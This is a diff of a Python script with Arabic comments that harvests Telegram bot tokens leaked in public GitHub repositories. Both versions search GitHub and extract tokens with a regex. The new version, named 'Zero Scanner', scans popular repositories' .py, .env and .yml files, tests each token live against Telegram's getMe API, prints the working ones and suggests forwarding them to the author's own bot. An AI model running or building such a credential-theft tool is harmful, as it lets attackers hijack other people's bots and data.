@@ -1,57 +1,58 @@
-import re
 import os
-import time
-from github import Github, GithubException
+import asyncio
+import aiohttp
+from github import Github
 
-def search_for_tokens():
-    token = os.getenv('GITHUB_TOKEN')
-    if not token:
-        print("[!] GITHUB_TOKEN غير موجود!")
-        return []
-        
-    print("[*] بدء عملية الصيد...")
+# إعدادات الاتصال
+GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
+g = Github(GITHUB_TOKEN)
+
+async def validate_token(session, token):
+    """التحقق من صحة التوكن عبر API تيليجرام"""
+    url = f"https://api.telegram.org/bot{token}/getMe"
     try:
-        g = Github(token)
-    except Exception as e:
-        print(f"[!] خطأ في الاتصال: {e}")
-        return []
+        async with session.get(url, timeout=5) as resp:
+            if resp.status == 200:
+                return await resp.json()
+    except Exception:
+        return None
+    return None
 
-    found_tokens = []
-    queries = [
-        'filename:main.py "bot_token"',
-        'filename:config.py "TOKEN"',
-        '"telebot.TeleBot"',
-        'telegram_token'
-    ]
+async def scanner_logic():
+    print("Zero Scanner: بدأت عملية البحث عن المستودعات ذات الجودة العالية...")
     
-    for query in queries:
-        print(f"[>] جاري فحص: {query}")
-        try:
-            # محاولة البحث مباشرة بدون فحص Rate Limit لتجنب الخطأ التقني
-            results = g.search_code(query=query, sort='indexed', order='desc')
+    # البحث عن مستودعات ذات نجوم عالية (أكبر من 50 نجمة) لضمان النشاط
+    repositories = g.search_repositories(query="telegram bot token", sort="stars", order="desc")
+    
+    async with aiohttp.ClientSession() as session:
+        for repo in repositories[:20]:  # فحص أفضل 20 مستودع في البحث
+            if repo.stargazers_count < 50:
+                continue
             
-            count = 0
-            for file in results:
-                if count >= 3: break # تقليل العدد لزيادة السرعة وتجنب الحظر
-                try:
-                    content = file.decoded_content.decode('utf-8')
-                    matches = re.findall(r'[0-9]{8,15}:[a-zA-Z0-9_-]{35}', content)
-                    for token in matches:
-                        if token not in found_tokens:
-                            found_tokens.append(token)
-                            count += 1
-                except: continue
+            print(f"جاري فحص: {repo.full_name} | النجوم: {repo.stargazers_count}")
             
-            print(f"[+] تم استخراج {count} توكن.")
-            time.sleep(10) # تأخير إجباري لتجنب حظر الـ 403
+            try:
+                # البحث عن ملفات تحتوي على احتمالية وجود توكن
+                contents = repo.get_contents("")
+                for content in contents:
+                    if content.type == "file" and content.name.endswith(('.py', '.env', '.yml')):
+                        file_content = content.decoded_content.decode('utf-8')
+                        
+                        # منطق بسيط لاستخراج التوكن (يمكنك تحسينه بالـ Regex)
+                        # ابحث عن الأنماط التي تشبه توكنات تيليجرام
+                        import re
+                        tokens = re.findall(r'\d{8,10}:[a-zA-Z0-9_-]{35}', file_content)
+                        
+                        for token in tokens:
+                            result = await validate_token(session, token)
+                            if result:
+                                print(f"✅ توكن صالح وجديد: {token}")
+                                # هنا يمكنك إضافة كود إرسال النتيجة لبوت التيليجرام الخاص بك
+            except Exception as e:
+                continue
             
-        except GithubException as e:
-            if e.status == 403:
-                print("[!] تم حظر الطلب من GitHub (403). انتظار دقيقة...")
-                time.sleep(60)
-            else:
-                print(f"[!] خطأ API: {e}")
-        except Exception as e:
-            print(f"[!] خطأ: {e}")
-            
-    return found_tokens
+            # تأخير بسيط لتجنب حظر الـ API
+            await asyncio.sleep(2)
+
+if __name__ == "__main__":
+    asyncio.run(scanner_logic())
